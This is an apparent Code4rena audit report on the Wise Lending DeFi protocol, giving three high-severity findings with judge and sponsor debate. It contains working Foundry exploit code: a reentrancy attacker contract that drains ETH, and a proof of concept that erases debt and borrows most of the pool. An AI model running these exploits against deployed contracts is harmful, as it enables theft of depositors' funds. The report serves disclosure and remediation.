[H-01] Exploitation of the receive Function to Steal Funds
Submitted by0xCiphky, also found byt0x1c
TheWiseLendingcontract incorporates a reentrancy guard through itssyncPoolmodifier, specifically within the_syncPoolBeforeCodeExecutionfunction. This guard is meant to prevent reentrancy during external calls, such as in thewithdrawExactAmountETHfunction, which processes ETH withdrawals for users.
However, there is currently a way to reset this guard, allowing for potential reentrant attacks during external calls. TheWiseLendingcontract includes areceivefunction designed to automatically redirect all ETH sent directly to it (apart from transactions from the WETH address) to a specified master address.
To forward the ETH the_sendValuefunction is used, here thesendingProgressvariable (which is used for reentrancy checks) is set to true to denote the start of the transfer process and subsequently reset to false following the completion of the call.
function_sendValue(address_recipient,uint256_amount)internal{if(address(this).balance<_amount) {revertAmountTooSmall();}sendingProgress=true;(boolsuccess,) =payable(_recipient).call{value:_amount}("");sendingProgress=false;if(success==false) {revertSendValueFailed();}}
As a result, an attacker could bypass an active reentrancy guard by initiating the receive function, effectively resetting thesendingProgressvariable. This action clears the way for an attacker to re-enter any function within the contract, even those protected by the reentrancy guard.
Having bypassed the reentrancy protection, let’s see how this vulnerability could be leveraged to steal funds from the contract.
ThewithdrawExactAmountETHfunction allows users to withdraw their deposited shares from the protocol and receive ETH, this function also contains ahealthStateCheckto ensure post withdrawal a users position is still in a healthy state. Note that this health check is done after the external call that pays out the user ETH, this will be important later on.
The protocol also implements apaybackBadDebtForTokenfunction that allows users to pay off any other users bad debt and receive a 5% incentive for doing so.
To understand how this can be exploited, consider the following example:
User A deposits 1 ETH into the protocol.User A borrows 0.5 ETH.User A callswithdrawExactAmountETHto withdraw 1 ETH.User A reenters the contract through the external call.User A resets the reentrancy guard with a direct transfer of 0.001 ETH to theWiseLendingcontract.Next, User A calls thepaybackBadDebtForTokenfunction to settle their own 0.5 ETH loan, which, due to the withdrawal, is now classified as bad debt. This not only clears the debt but also secures 0.5 ETH plus an additional incentive for User A.With the bad debt cleared, thehealthStateCheckwithin the withdrawal function is successfully passed.Consequently, User A manages to retrieve their initial 1 ETH deposit and gain an additional 0.5 ETH (plus the incentive for paying off bad debt).
Proof Of Concept
Testing is done in theWiseLendingShutdownTestfile, withContractAimported prior to executing tests:
// import ContractAimport"./ContractA.sol";// import MockErc20import"./MockContracts/MockErc20.sol";contractWiseLendingShutdownTestisTest{...ContractApubliccontractA;function_deployNewWiseLending(bool_mainnetFork)internal{...contractA=newContractA(address(FEE_MANAGER_INSTANCE),payable(address(LENDING_INSTANCE)));...}
functiontestExploitReentrancy()public{uint256depositValue=10ether;uint256borrowAmount=2ether;vm.deal(address(contractA),2ether);ORACLE_HUB_INSTANCE.setHeartBeat(WETH_ADDRESS,100days);POSITION_NFTS_INSTANCE.mintPosition();uint256nftId=POSITION_NFTS_INSTANCE.tokenOfOwnerByIndex(address(this),0);LENDING_INSTANCE.depositExactAmountETH{value:depositValue}(nftId);LENDING_INSTANCE.borrowExactAmountETH(nftId,borrowAmount);vm.prank(address(LENDING_INSTANCE));MockErc20(WETH_ADDRESS).transfer(address(FEE_MANAGER_INSTANCE),1ether);// check contractA balanceuintethBalanceStart=address(contractA).balance;uintwethBalanceStart=MockErc20(WETH_ADDRESS).balanceOf(address(contractA));//totaluinttotalBalanceStart=ethBalanceStart+wethBalanceStart;console.log("totalBalanceStart",totalBalanceStart);// deposit using contractAvm.startPrank(address(contractA));LENDING_INSTANCE.depositExactAmountETHMint{value:2ether}();vm.stopPrank();FEE_MANAGER_INSTANCE._increaseFeeTokens(WETH_ADDRESS,1ether);// withdraw weth using contractAvm.startPrank(address(contractA));LENDING_INSTANCE.withdrawExactAmount(2,WETH_ADDRESS,1ether);vm.stopPrank();// approve feemanager for 1 weth from contractAvm.startPrank(address(contractA));MockErc20(WETH_ADDRESS).approve(address(FEE_MANAGER_INSTANCE),1ether);vm.stopPrank();// borrow using contractAvm.startPrank(address(contractA));LENDING_INSTANCE.borrowExactAmount(2,WETH_ADDRESS,0.5ether);vm.stopPrank();// Payback amount//499537556593483218// withdraw using contractAvm.startPrank(address(contractA));LENDING_INSTANCE.withdrawExactAmountETH(2,0.99ether);vm.stopPrank();// check contractA balanceuintethBalanceAfter=address(contractA).balance;uintwethBalanceAfter=MockErc20(WETH_ADDRESS).balanceOf(address(contractA));//totaluinttotalBalanceAfter=ethBalanceAfter+wethBalanceAfter;console.log("totalBalanceAfter",totalBalanceAfter);uintdiff=totalBalanceAfter-totalBalanceStart;assertEq(diff>5e17,true,"ContractA profit greater than 0.5 eth");}
// SPDX-License-Identifier: -- WISE --pragmasolidity=0.8.24;// import lending and fees contractsimport"./WiseLending.sol";import"./FeeManager/FeeManager.sol";contractContractA{addresspublicfeesContract;addresspayablepubliclendingContract;addressconstantWETH_ADDRESS=0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;constructor(address_feesContract,addresspayable_lendingContract)payable{feesContract=_feesContract;lendingContract=_lendingContract;}fallback()externalpayable{if(msg.sender==lendingContract) {// send lending contract 0.01 eth to reset reentrancy flag(boolsent,bytesmemorydata) =lendingContract.call{value:0.01ether}("");//paybackBadDebtForTokenFeeManager(feesContract).paybackBadDebtForToken(2,WETH_ADDRESS,WETH_ADDRESS,499537556593483218);}}}
Impact
This vulnerability allows an attacker to illicitly withdraw funds from the contract through the outlined method. Additionally, the exploit could also work using the contract’s liquidation process instead.
Tools Used
Foundry
Recommendation
Edit the_sendValuefunction to include a reentrancy check. This ensures that the reentrancy guard is first checked, preventing attackers from exploiting this function as a reentry point. This will also not disrupt transfers from the WETH address as those don’t go through the_sendValuefunction.
function_sendValue(address_recipient,uint256_amount)internal{if(address(this).balance<_amount) {revertAmountTooSmall();}_checkReentrancy();//add heresendingProgress=true;(boolsuccess,) =payable(_recipient).call{value:_amount}("");sendingProgress=false;if(success==false) {revertSendValueFailed();}}
vonMangoldt (Wise Lending) commented via duplicate issue #40:
Good catch but we don’t consider it a high since nouserFundsrelevant state variables are changed after sending the value. And since such a call would encapsulate theborrowratecheck at the end, everything works as planned and it cannot be used to block funds or extract value or drain funds or anything. Still good to add a reentrancy check to receive function just in case.UPDATE EDIT: Ok, you also submitted a stealing of funds POC we will take a look.
vonMangoldt (Wise Lending) commented via duplicate issue #40:
Seems like this doesn’t endanger users. A user is able to borrow beyond his allowed limit. It’s basically just a flashloan without permission?
Wise Lending commented:
Mitigatedhere.

[H-02] User can erase their position debt for free
Submitted byDup1337
https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/FeeManager/FeeManager.sol#L816-L866
https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/MainHelper.sol#L667-L727
Vulnerability details
When the pool token stops being used in the position, the_removePositionDatafunction is called. However, it assumes thatpoolTokenthat is passed as a parameter always exists in user token array, which is not always the case. In the case of functionFeeManager.paybackBadDebtNoReward(), which indirectly calls_removePositionData, insufficient validation doesn’t check if repay token is in user array, which results in zeroing out information about user debt.
Impact
Free elimination of user debt.
Proof of Concept
First, let’s see howMainHelper._removePositionData()works:
function_removePositionData(uint256_nftId,address_poolToken,function(uint256)viewreturns(uint256)_getPositionTokenLength,function(uint256,uint256)viewreturns(address)_getPositionTokenByIndex,function(uint256,address)internal_deleteLastPositionData,boolisLending)private{uint256length=_getPositionTokenLength(_nftId);if(length==1) {_deleteLastPositionData(_nftId,_poolToken);return;}uint8i;uint256endPosition=length-1;while(i<length) {if(i==endPosition) {_deleteLastPositionData(_nftId,_poolToken);break;}if(_getPositionTokenByIndex(_nftId,i) !=_poolToken) {unchecked{++i;}continue;}addresspoolToken=_getPositionTokenByIndex(_nftId,endPosition);isLending==true?positionLendTokenData[_nftId][i] =poolToken:positionBorrowTokenData[_nftId][i] =poolToken;_deleteLastPositionData(_nftId,_poolToken);break;}}
So,_poolTokensent in parameter is not checked if:
The position consists of only one token. Then the token is removed, no matter if it’s_poolTokenor not.No token was found during the position token iteration. In which case, the last token is removed, no matter if it’s_poolTokenor not.
This function is called inMainHelper._corePayback(), which in turn is called inFeeManager.paybackBadDebtNoReward() => WiseLending.corePaybackFeeManager() => WiseLending._handlePayback(). The important factor is thatpaybackBadDebtNoReward()doesn’t check if position utilizes_paybackTokenpassed by the caller and allows it to pass any token. The only prerequisite is thatbadDebtPosition[_nftId]has to be bigger than0:
functionpaybackBadDebtNoReward(uint256_nftId,address_paybackToken,uint256_shares)externalreturns(uint256paybackAmount){updatePositionCurrentBadDebt(_nftId);if(badDebtPosition[_nftId] ==0) {return0;}if(WISE_LENDING.getTotalDepositShares(_paybackToken) ==0) {revertPoolNotActive();}paybackAmount=WISE_LENDING.paybackAmount(_paybackToken,_shares);WISE_LENDING.corePaybackFeeManager(_paybackToken,_nftId,paybackAmount,_shares);_updateUserBadDebt(_nftId);// [...]
With these pieces of information, we can form following attack path:
Prepare a big position that will have be destined to have positivebadDebt. For sake of the argument, let’s assume it’s$1Mworth of ETH.Prepare a very small position that will not be incentivized to be liquidated by liquidators, just to achieve non-zerobadDebt. This can be done, for example, before significant price update transaction from Chainlink. Then take$1Mworth of ETH flashloan and put this as collateral to position, borrowing as much as possible.CallFeeManager.paybackBadDebtNoReward()on the position with desired positionnftId, USDC token address and0shares as input params.Because there is non-zero bad debt, the check will pass, and the logic will finally reachMainHelper._corePayback(). Because repay is0shares, the diminishing position size in USDC token will not underflow and position token will be tried to be removed:
function_corePayback(uint256_nftId,address_poolToken,uint256_amount,uint256_shares)internal{_updatePoolStorage(_poolToken,_amount,_shares,_increaseTotalPool,_decreasePseudoTotalBorrowAmount,_decreaseTotalBorrowShares);_decreasePositionMappingValue(userBorrowShares,_nftId,_poolToken,_shares);if(userBorrowShares[_nftId][_poolToken] >0) {return;}_removePositionData({_nftId:_nftId,_poolToken:_poolToken,_getPositionTokenLength:getPositionBorrowTokenLength,_getPositionTokenByIndex:getPositionBorrowTokenByIndex,_deleteLastPositionData:_deleteLastPositionBorrowData,isLending:false});
Inside_removePositionData, because position length is 1, no checks to confirm if the token address matches will be performed:
uint256length=_getPositionTokenLength(_nftId);if(length==1) {_deleteLastPositionData(_nftId,_poolToken);return;}
This means that all information about user borrows are deleted. Meaning, that now system thinks the user has$1Mcollateral, and no debt. Which means that the attacker just stole the entire borrowed amount.
Recommended Mitigation Steps
Add verification if the token that is passed to_removePositionData()exists in user tokens. If not, revert the transaction.
Assessed type
Invalid Validation
vonMangoldt (Wise Lending) commented:
Double checking line of reasoning fails when user deposits large amount and then borrows.Prepare big position that will have be destined to have positivebadDebt. For sake of the argument, let’s assume it’s$1Mworth of ETH.Prepare very small position that will not be incentivized to be liquidated by liquidators, just to achieve non-zerobadDebt. This can be done for example before significant price update transaction from Chainlink. Then take$1Mworth of ETH flashloan and put this as collateral to position, borrowing as much as possible.CallFeeManager.paybackBadDebtNoReward()on the position with desired positionnftId, USDC token address and0shares as input params.Because there is non-zero bad debt, the check will pass, and and the logic will finally reachMainHelper._corePayback(). Because repay is0shares, diminishing position size in USDC token will not underflow, and position token will be tried to be removed:Comment:Ok say big position hasnftId= 1.Ok say small position hasnftId= 2.nftId2 now takes more collateral and borrows max:
then callspaybackBadDebtNoRewardwithnftId2.But since collateral has been deposited and borrowed within non liquidation range (healthstate check active remember),This line here:updatePositionCurrentBadDebt(_nftId);in the beginning will setbadDebtPosition[_nft]to0meaning it will exit after this line:if (badDebtPosition[_nftId] == 0) {return 0;}and no harm done.
deliriusz (warden) commented:
@Trust - I have provided the coded PoC below. It shows that user is able to steal whole protocol funds, due to wrong algorithm in_removePositionData(). I managed to not use very big position and a single token, which makes this issue even easier to perform.PoC provided below does the following:Setup initial state - 2 lenders depositing 100 ETH each, and 1 borrower whose position will have bad debt. For the purpose of this test I chose market crash condition; however, using a small position that will give no incentives to liquidate it will also work.Position is underwater and is liquidated in order to increase bad debt for user position. This is a prerequisite for being able to trigger bad debt repayment.When bad debt repayment is triggered for a token that user didn’t use,_removePositionData()removes last token in user borrow tokens. In this case that means that the user doesn’t have any tokens in his debt tokens listed.User borrows 95% of ALL ETH that the protocol holds. It’s possible, because when performing health check at the end of borrow, all user borrow tokens are iterated through - and remember that we just removed the token.At the end I verified that the user really got the funds, which proves that the issue is real.// SPDX-License-Identifier: -- WISE --pragmasolidity=0.8.24;import"./WiseLendingBaseDeployment.t.sol";contractDebtClearTestisBaseDeploymentTest{addressborrower=address(uint160(uint(keccak256("alice"))));addresslender=address(uint160(uint(keccak256("bob"))));addresslender2=address(uint160(uint(keccak256("bob2"))));uint256depositAmountETH=100ether;// 10 etheruint256depositAmountToken=10ether;// 10 etheruint256borrowAmount=5e18;// 5 etheruint256nftIdLiquidator;// nftId of lenderuint256nftIdLiquidatee;// nftId of borroweruint256debtShares;function_setupIndividualTest()internaloverride{_deployNewWiseLending(false);// set token value for simple calculationsMOCK_CHAINLINK_2.setValue(1ether);// 1 token == 1 ETHassertEq(MOCK_CHAINLINK_2.latestAnswer(),MOCK_CHAINLINK_ETH_ETH.latestAnswer());vm.stopPrank();// fund lender and borrowervm.deal(lender,depositAmountETH);vm.deal(lender2,depositAmountETH);deal(address(MOCK_WETH),lender,depositAmountETH);deal(address(MOCK_ERC20_2),borrower,depositAmountToken*2);deal(address(MOCK_ERC20_1),lender,depositAmountToken*2);}functiontestRemovingToken()public{IERC20WETH=IERC20(LENDING_INSTANCE.WETH_ADDRESS());// lender supplies ETHvm.startPrank(lender);nftIdLiquidator=POSITION_NFTS_INSTANCE.mintPosition();// deposit 100 ether into the poolLENDING_INSTANCE.depositExactAmountETH{value:depositAmountETH}(nftIdLiquidator);vm.stopPrank();// prank second provider to make sure that the borrower is able to// steal everyone's funds latervm.startPrank(lender2);uintnftIdfundsProvider=POSITION_NFTS_INSTANCE.mintPosition();// deposit 100 ether into the poolLENDING_INSTANCE.depositExactAmountETH{value:depositAmountETH}(nftIdfundsProvider);vm.stopPrank();// borrower supplies collateral token and borrows ETHvm.startPrank(borrower);MOCK_ERC20_2.approve(address(LENDING_INSTANCE),depositAmountToken*2);nftIdLiquidatee=POSITION_NFTS_INSTANCE.mintPosition();vm.warp(block.timestamp+10days);LENDING_INSTANCE.depositExactAmount(// supply collateralnftIdLiquidatee,address(MOCK_ERC20_2),10);debtShares=LENDING_INSTANCE.borrowExactAmountETH(nftIdLiquidatee,borrowAmount);// borrow ETHvm.stopPrank();// shortfall event/crash occurs. This is just one of the possibilities of achieving bad debt// second is maintaining small position that gives no incentive to liquidate it.vm.prank(MOCK_DEPLOYER);MOCK_CHAINLINK_2.setValue(0.3ether);// borrower gets partially liquidatedvm.startPrank(lender);MOCK_WETH.approve(address(LENDING_INSTANCE),depositAmountETH);LENDING_INSTANCE.liquidatePartiallyFromTokens(nftIdLiquidatee,nftIdLiquidator,address(MOCK_WETH),address(MOCK_ERC20_2),debtShares*2e16/1e18+1);vm.stopPrank();// global and user bad debt is increaseduint256totalBadDebt=FEE_MANAGER_INSTANCE.totalBadDebtETH();uint256userBadDebt=FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);assertGt(totalBadDebt,0);assertGt(userBadDebt,0);assertEq(totalBadDebt,userBadDebt);// user bad debt and global bad debt are the samevm.startPrank(lender);MOCK_ERC20_1.approve(address(LENDING_INSTANCE),type(uint256).max);MOCK_ERC20_1.approve(address(FEE_MANAGER_INSTANCE),type(uint256).max);MOCK_WETH.approve(address(FEE_MANAGER_INSTANCE),type(uint256).max);// check how much tokens the position that will be liquidated hasuint256lb=LENDING_INSTANCE.getPositionBorrowTokenLength(nftIdLiquidatee);assertEq(lb,1);uint256ethValueBefore=SECURITY_INSTANCE.getETHBorrow(nftIdLiquidatee,address(MOCK_ERC20_2));console.log("ethBefore ",ethValueBefore);// **IMPORTANT** this is the core of the issue// When bad debt occurs, there are 2 critical checks missing:// 1. that the amount to repay is bigger than 0// 2. that the token to repay bad debt has the bad debt for user// This allows to remove any token from the list of user borrow tokens,// because of how finding token to remove algorithm is implemented:// it iterates over all the tokens and if it doesn't find matching one// until it reaches last, it wrongly assumes that the last token is the// one that should be removed.// And not checking for amount of repayment allows to skip Solidity underflow// checks on diminishing user bad debt.FEE_MANAGER_INSTANCE.paybackBadDebtNoReward(nftIdLiquidatee,address(MOCK_ERC20_1),// user doesn't have debt in this token0);uint256ethValueAfter=SECURITY_INSTANCE.getETHBorrow(nftIdLiquidatee,address(MOCK_ERC20_2));uint256ethWethValueAfter=SECURITY_INSTANCE.getETHBorrow(nftIdLiquidatee,address(WETH));console.log("ethAfter ",ethValueAfter);// assert that the paybackBadDebtNoReward removed token that it shouldn'tuint256la=LENDING_INSTANCE.getPositionBorrowTokenLength(nftIdLiquidatee);assertEq(la,0);vm.stopPrank();uintlendingWethBalance=WETH.balanceOf(address(LENDING_INSTANCE));console.log("lb ",lendingWethBalance);console.log("bb ",borrower.balance);vm.startPrank(borrower);// borrow 95% of ALL ETH that the protocol possesses// this works, because when calculating health check of a position// it iterates through `getPositionBorrowTokenLength()` - and we// were able to remove it.debtShares=LENDING_INSTANCE.borrowExactAmountETH(nftIdLiquidatee,WETH.balanceOf(address(LENDING_INSTANCE)) *95/100);// borrow ETHconsole.log("lb ",WETH.balanceOf(address(LENDING_INSTANCE)));console.log("ba ",borrower.balance);// make sure that borrow tokens were not increaseduint256la2=LENDING_INSTANCE.getPositionBorrowTokenLength(nftIdLiquidatee);assertEq(la2,0);// verify that ~95% were taken from the pool and borrower received themassertLt(WETH.balanceOf(address(LENDING_INSTANCE)),lendingWethBalance*6/100);assertGt(borrower.balance,lendingWethBalance*94/100);uint256ethValueAfter2=SECURITY_INSTANCE.getETHBorrow(nftIdLiquidatee,address(MOCK_ERC20_2));console.log("ethAfter2 ",ethValueAfter2);vm.stopPrank();// borrowing doesn't increase user borrowassertEq(ethValueAfter,ethValueAfter2);}}At the end of the test, it’s verified that user is in possession of ~95% of the ETH that was initially deposited to the pool.
Trust (judge) commented:
Confirmed the test passes.[PASS] testRemovingToken() (gas: 2242360)Logs:ORACLE_HUB_INSTANCE DEPLOYED AT ADDRESS 0x6D93d20285c95BbfA3555c00f5206CDc1D78a239POSITION_NFTS_INSTANCE DEPLOYED AT ADDRESS 0x1b5a405a4B1852aA6F7F65628562Ab9af7e2e2e9LATEST RESPONSE 1000000000000000000ethBefore  300000000000000000ethAfter  300000000000000000lb  195100000000000000001bb  5000000000000000000lb  9755000000000000001ba  190345000000000000000ethAfter2  300000000000000000The likelihood/impact are in line with high severity.
A POC was not initially provided, but the step by step given is deemed sufficient.
vm06007 (Wise Lending) commented:
@Foon256 or @vonMangoldt - can check this again I think. I’ll check what kind of code change we need to add in order to prevent this scenario.
Foon256 (Wise Lending) commented:
The POC is correct but different from the previous presented attack, which was not possible as @vonMangoldt has shown. I don’t know about the rules in this case, because the POC has been submitted long after the deadline and is a different attack than submitted before.
Trust (judge) commented:
The warden’s identification of the root cause is correct and the severity is correct. If there were different submissions this would have gotten a 50%, but for solo finds there is no mechanism for partial scoring.
Alex the Entreprenerd (Appellate Court lead judge) commented:
Summary of the issueDue to an incorrect logic, it is possible for a user to have all of their debt forgiven by repaying another bad debt position with a non-existing token.Alex the Entreprenerd’s (Appellate Court lead judge) inputFacts:paybackBadDebtNoRewardcan be called with non existentpaybacktoken.FirstpoolTokenbad debt position will be deleted by default.Remove position in the original submission is not fully clear, but is implicitly mentioning using_deleteLastPositionBorrowDatafor_removePositionData.This will forgive the bad debt and break the system.Was disputed due to this.This asserts that the attack cannot be done atomically, that’s true.The original submission explains that, due to generating bad debt.I believe that the finding has shown a way for bad debt to be forgiven, and that the race condition around “proper” vs “malicious” liquidators is not a major decision factor.I would like to add that the original submission is passable but should have done a better job at:Using only necessary snippets, with comments and tags.Explain each logical step more simply (A calls B, B is pointer to C, C is doing X).I believe the root cause and the attack was shown in the original submission and as such believe the finding to be valid and high severity.hickuphh3’s (judge 2) inputThis issue should’ve been accompanied with a POC, then there would be no disambiguity over its validity and severity.I agree with the judge’s assessment. The warden correctly identified the root cause of lacking input validation of_poolToken, which allows_removePositionDatato incorrectly remove borrowed positions, thus erasing that user’s debt.The severity of this alone is high, as it effectively allows the user to forgo repaying his debt.I disagree with the statement that the POC is different from the previous presented attack. It is roughly the same as the presented step-by-step walkthrough, with amplified impact: the user is able to borrow more tokens for free subsequently, without having to repay.Disregarding the POC that was submitted after the audit, IMO, the line-by-line walkthrough sufficiently proved the issue.LSDan’s (judge 3) InputI think this one should be held as invalid due tothis rulingin Decisions from the inaugural Supreme Court session.As far as I can see, the swaying information was the POC added after the submission deadline. It doesn’t matter if the issue was technically correct. The quality was not high enough to lead the judge to mark it as satisfactory without the additional information. @Alex The Entreprenerd thoughts?Alex The Entreprenerd (Appellate Court lead judge) commented:I don’t think the POC added any additional info that was not present in the original submission. Invalid token causes default pop of real token. That was identified in the original submission.I think the dispute by the sponsor was incorrect as asserting that this cannot be done atomically doesn’t justify the bug of mismatch address causing defaults being forgiven. I think the POC added context over content.LSDan (judge 3) commented:Apologies guys… didn’t read it carefully enough on the first pass. I’ve re-evaluated and while I don’t like the quality of the original submission and would probably have invalidated it myself, I’m willing to align with the two of you and leave it as high risk. The attack is valid and the nuance is in interpreting rules, not validity.Additional input from the Sponsor (Requested by the Lead Judge) via discordAlex The Entreprenerd (Appellate Court lead judge) commented:For issue 215, I’d like to ask you what you think was invalid about the first submission and what’s specifically makes the original submission different from the POC sent after? We understand that the quality of the original submission is sub optimal.Foon (Wise Lending):Referenced the original commenthere.Alex The Entreprenerd (Appellate Court lead judge) commented:This makes sense as there is no way to attack the protocol in the same tx. However, if the price were to fall, then wouldn’t the attacker be able to apply the attack mentioned in the original submission?hodldoor (Wise Lending) commented:They will be liquidated beforehand. That why the submittor mentioned it is necessary to create a position which is small hence no incentivize to liquidate. Again, the way described by submittor does not work as pointed out in github and here again.Alex The Entreprenerd (Appellate Court lead judge) commented:My understanding of the issue is that by specifying a non-existing token for liquidation, the first token is popped without paying for the position debt. Am I missing something about this?hodldoor (Wise Lending) commented:Not for liquidation.For payingback edit:paybackBadDebtNoRewardonly works for positions with bad debt, but bad debt usually accrues with debt and no collateral. Only time it doesn’t is if collateral is so small gas is more expensive than to liquidate beforehand while price from collateral is falling.Foon (Wise Lending) commented:For payingback bad debt positions withpaybackBadDebtNoReward(), we added this feature to be able to remove bad debt from the protocol. User can do it and get a little incentive withpaybackBadDebtForToken()or a generous donor. The team can pay it back for free withpaybackBadDebtNoReward().paybackBadDebtForToken()is only possible if there is some collateral left in the bad debt position nft.hodldoor (Wise Lending) commented:the for free part is technically not needed anymore anyway since we opened paying back for everyoneAlex The Entreprenerd (Appellate Court lead judge) commented:Ok. What do you think changed from the original submission and the POC that makes the finding different?hodldoor (Wise Lending) commented:You mean the PoC after deadline which is, therefore, not counted? He just manipulates price so that no one has the chance to liquidate. If we look at the point from the poc provided AFTER deadline (invalid therefore anyway), then we conclude it’s anexpectedValuequestion.Attacker either donates liquidation incentives to liquidators and therefore, loses money (10%). Or gains money if he’s lucky that he doesn’t get liquidated within a 10-20% price difference and gets to call the other function first.
So if you think as an attacker the probability that ETH drops 20% in one chainlink update (as far as I know, that has never happened before) or that during a 20% drawdown liquidators don’t get put into a block and this likelihood is bigger than 5% OVERALL then you would make money.The chance of liquidators not picking up free money I would say is more in the low 0.001% estimation rather than 5%. So on average it’s highly minus -ev to do that.Alex The Entreprenerd (Appellate Court lead judge) commented:Good points, thank you for your thoughts! What are your considerations about the fact that the attacker could just participate in the MEV race, allowing themselves to either front-run or be the first to self-liquidate as a means to enact the attack?Shouldn’t the system ideally prevent this scenario from ever being possible?The Wise Admiral (Wise Lending) commented:I’ll let my devs comment on your question about the attacker participating as a liquidator, but as far as the last part about “shouldn’t the system prevent”I do not believe our position on this finding is that it’s objectively invalid. In fact, I’m sure we have already patched it for our live code which is already deployed on Arbitrum. Our position is that, per the C4 rules the submission is invalid for this specific competitive audit Feb 19th - March 11th and should not be listed in the findings or receive rewards, as it would be unfair to take away money from the other wardens who did submit findings in the time frame given. That being said, we are willing to accept it as a medium finding as a compromise.hodldoor (Wise Lending) commented:The attack does not start with liquidating it is stopped by liquidating (including if the attacker liquidates), if it’s in time relating to liquidation incentive vs distance between collateral in debt in percentage. That’s why in a poc you need to manipulate price instantly a great deal without being liquidated (doesn’t matter by whom).DeliberationWe believe that the dispute from the Sponsor comes from a misunderstanding of the submission which ultimately shows an incorrect logic when dealing with liquidations.While the specifics of the submission leave a lot to be desired, the original submission did identify the root cause, this root cause can be weaponized in a myriad of ways, and ultimately gives the chance to an underwater borrower to get a long forgiven.For this reason we believe the finding to be a High Severity finding.Additional Context by the Lead JudgeWe can all agree that a POC of higher quality should have been sent, that said our objective at C4 is to prevent real exploits, over a sufficiently long span of time, dismissing barely passable findings would cause more exploits, which will cause real damage to Projects and People using them as well as taint the reputation of C4 as a place where “No stone is left unturned”.I would recommend the staff to look into ways to penalize these types of findings (for example, give a bonus to the judge as an extensive amount of time was necessary to prove this finding).But I fail to see how dismissing this report due to a lack of POC would help the Sponsor and Code4rena over the long term.
Wise Lending commented:
Mitigatedhere.

[H-03] Incorrect bad debt accounting can lead to a state where theclaimFeesBeneficialfunction is permanently bricked and no new incentives can be distributed, potentially locking pending and future protocol fees in theFeeManagercontract
Submitted byJCN, also found byserial-coder,0xStalin, andDraiakoo
Protocol fees can be collected from theWiseLendingcontract and sent to theFeeManagercontract via the permissionlessFeeManager::claimWiseFeesfunction. During this call, incentives will only be distributed forincentive ownersiftotalBadDebtETH(global bad debt) is equal to0:
FeeManager::claimWiseFees
663:if(totalBadDebtETH==0) {// @audit: incentives only distributed if there is no global bad debt664:665:tokenAmount=_distributeIncentives(// @audit: distributes incentives for `incentive owners` via `gatheredIncentiveToken` mapping666:tokenAmount,667:_poolToken,668:underlyingTokenAddress669:            );670:        }
The fees sent to theFeeManagerare then able to be claimed bybeneficialsvia theFeeManager::claimFeesBeneficialfunction or byincentive ownersvia theFeeManager::claimIncentivesfunction (if incentives have been distributed to the owners):
FeeManager::claimIncentives
284:functionclaimIncentives(285:address_feeToken286:    )287:public288:    {289:uint256amount=gatheredIncentiveToken[msg.sender][_feeToken];// @audit: mapping incremented in _distributeIncentives function290:291:if(amount==0) {292:revertNoIncentive();293:        }
However,beneficialsare only able to claim fees if there is currently no global bad debt in the system (totalBadDebtETH == 0).
FeeManager::claimFeesBeneficial
689:functionclaimFeesBeneficial(690:address_feeToken,691:uint256_amount692:    )693:external694:    {695:addresscaller=msg.sender;696:697:if(totalBadDebtETH>0) {// @audit: can't claim fees when there is bad debt698:revertExistingBadDebt();699:        }
Below I will explain how the bad debt accounting logic used during partial liquidations can result in a state wheretotalBadDebtETHis permanently greater than0. When this occurs,beneficialswill no longer be able to claim fees via theFeeManager::claimFeesBeneficialfunction and new incentives will no longer be distributed when fees are permissionlessly collected via theFeeManager::claimWiseFeesfunction.
When a position is partially liquidated, theWiseSecurity::checkBadDebtLiquidationfunction is executed to check if the position has created bad debt, i.e. if the position’s overall borrow value is greater than the overall (unweighted) collateral value. If the post liquidation state of the position created bad debt, then the bad debt is recorded in a global and position-specific state:
WiseSecurity::checkBadDebtLiquidation
405:functioncheckBadDebtLiquidation(406:uint256_nftId407:    )408:external409:onlyWiseLending410:    {411:uint256bareCollateral=overallETHCollateralsBare(412:_nftId413:        );414:415:uint256totalBorrow=overallETHBorrowBare(416:_nftId417:        );418:419:if(totalBorrow<bareCollateral) {// @audit: LTV < 100%420:return;421:        }422:423:unchecked{424:uint256diff=totalBorrow425:                -bareCollateral;426:427:FEE_MANAGER.increaseTotalBadDebtLiquidation(// @audit: global state, totalBadDebtETH += diff428:diff429:            );430:431:FEE_MANAGER.setBadDebtUserLiquidation(// @audit: position state, badDebtPosition[_nftId] = diff432:_nftId,433:diff434:            );435:        }436:    }
FeeManagerHeper.sol
77:function_setBadDebtPosition(78:uint256_nftId,79:uint256_amount80:    )81:internal82:    {83:badDebtPosition[_nftId] =_amount;// @audit: position bad debt set84:    }85:86:/**87:     *@devInternal increase function for global bad debt amount.88:     */89:function_increaseTotalBadDebt(90:uint256_amount91:    )92:internal93:    {94:totalBadDebtETH+=_amount;// @audit: total bad debt incremented
As we can see above, the method by which the global and position’s state is updated is not consistent (total debt increases, but position’s debt is set to recent debt). Since liquidations can be partial, a position with bad debt can undergo multiple partial liquidations and each time thetotalBadDebtETHwill be incremented. However, thebadDebtPositionfor the position will only be updated with the most recent bad debt that was recorded during the last partial liquidation. Note that due to the condition on line 419 ofWiseSecurity::checkBadDebtLiquidation, thebadDebtPositionwill be reset to0whentotalBorrow == bareCollateral(LTV == 100%). However, in this case, any previously recorded bad debt for the position willnotbe deducted from thetotalBadDebtETH. Lets consider two examples:
Scenario 1: Due to a market crash, a position’s LTV goes above 100%. The position gets partially liquidated, incrementingtotalBadDebtETHbyx(bad debt from 1st liquidation) and settingbadDebtPosition[_nftId]tox. The position gets partially liquidated again, this time incrementingtotalBadDebtETHbyy(bad debt from 2nd liquidation) and settingbadDebtPosition[_nftId]toy. The resulting state:
totalBadDebtETH == x + ybadDebtPosition[_nftId] == y
Scenario 2: Due to a market crash, a position’s LTV goes above 100%. The position gets partially liquidated, incrementingtotalBadDebtETHbyxand settingbadDebtPosition[_nftId]tox. The position gets partially liquidated again, but this time thetotalBorrowis equal tobareCollateral(LTV == 100%) and thus no bad debt is created. Due to the condition on line 419,totalBadDebtETHwill be incremented by0, butbadDebtPosition[_nftId]will be reset to0. The resulting state:
totalBadDebtETH == xbadDebtPosition[_nftId] == 0
Note: Scenario 1 is more likely to occur since Scenario 2 requires the additional partial liquidation to result in an LTV of exactly 100% for the position.
As we can see, partial liquidations can lead tototalBadDebtETHbeing artificially inflated with respect to the actual bad debt created by a position.
